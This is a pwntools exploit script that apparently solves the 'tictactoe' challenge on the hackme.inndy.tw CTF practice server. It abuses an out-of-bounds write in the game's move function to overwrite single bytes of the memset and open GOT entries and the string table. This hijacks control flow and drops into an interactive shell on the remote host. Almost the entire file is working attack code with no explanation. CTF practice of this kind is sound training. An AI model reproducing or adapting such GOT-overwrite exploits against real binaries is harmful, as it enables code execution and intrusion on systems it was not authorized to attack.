#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
from sys import argv
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

if argv[1] == 'l':
    io = process('./tictactoe', env = {'LD_PRELOAD':'./libc-2.23.so.i386'})
    libc = ELF('./libc-2.23.so.i386')

elif argv[1] == 'd':
    io = process('./tictactoe')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')

else :
    io = remote('hackme.inndy.tw', 7714)
    libc = ELF('./libc-2.23.so.i386')
elf = ELF('./tictactoe')
grid = 0x804B056
role = 0x804b048


def move(n):
    io.sendlineafter('flavor): ', str(n))

def changeByte(val, addr):
    io.sendlineafter('flavor): ', '9')
    io.sendline(val)
    move(addr - grid)


if __name__ == '__main__':
    raw_input('debug>')
    io.sendlineafter('nd? ', '1')
    # chagne memset to loop
    changeByte('\xb3', 0x804b034)
    changeByte('\x8b', 0x804b035)

    # change role and strtab
    changeByte('s', 0x804b048)     
    changeByte('\xc8', 0x804af58)
    changeByte('h', 0x804b049)
    changeByte('\x9f', 0x804af59)
    
    # chagne open.got to 08048CF7
    changeByte('\xf7', 0x804b02c)
    changeByte('\x8c', 0x804b02d)
    # draw
    print 'it shoule draw and run from (for) now'
    # change memset.got to memset.plt+6 0x8048576
    changeByte('\x76', 0x804b034)
    changeByte('\x85', 0x804b035)

    # to win 
    for i in range(6):
        move(i)
    # 

    
    
    io.interactive()
    io.close()
